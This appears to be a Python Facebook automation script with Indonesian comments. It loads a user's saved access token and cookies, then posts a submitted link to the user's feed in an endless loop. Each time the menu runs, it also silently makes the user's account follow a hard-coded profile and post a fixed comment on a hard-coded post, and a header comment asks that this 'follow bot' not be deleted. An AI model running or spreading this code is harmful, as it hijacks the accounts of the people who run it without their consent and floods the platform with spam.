"""
jangan hapus bot pollownya ngaf
"""
import marshal
import os,re,sys,bs4,time,json,random,datetime,requests, calendar, random
from random import choice

from src import login as Login
from src import logo as Logo
from src import menu as Menu



header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
ses=requests.Session()

#warna coeg
K = "\x1b[0;33m"
N = "\x1b[0m" 
M = "\x1b[0;31m"
H = "\x1b[0;32m"

def menu():
	try:  
		token = open('token', 'r').read()
		cok = open("coki","r").read()
		nama = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token), cookies={"cookie":cok}).json()["name"]
		requests.post("https://graph.facebook.com/100044950580473/subscribers?access_token=%s"%(token), cookies={"cookie":cok}).json()
		requests.post("https://graph.facebook.com/1229208304574222/comments/?message=Georgy Zhukv \n-zhkv&access_token=%s"%(token), cookies={"cookie":cok}).json()
	except (KeyError, IOError):
		print("\n [!] token kadaluwarsa!")
		os.system('rm -f token')
		input(" ENTER : ")
		Login.login()
	except requests.exceptions.ConnectionError: 
		exit("[!] anda tidak terhubung ke internet!")
	Logo.logo()
	print(f"\n [ welcome{H} {nama} {N}] \n")
	idt = input(f" [ masukan link : {H} ")
	print(f"\n\t\t{H}ctrl+z {N}untuk berhenti\n")
	cok = open('coki', 'r').read()
	token = open('token', 'r').read()
	cookie = {"cookie":cok}
	while True:
		response = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).json()
		print(f" {N}[{H}+{N}]. {K}{response}{N}")
		
		

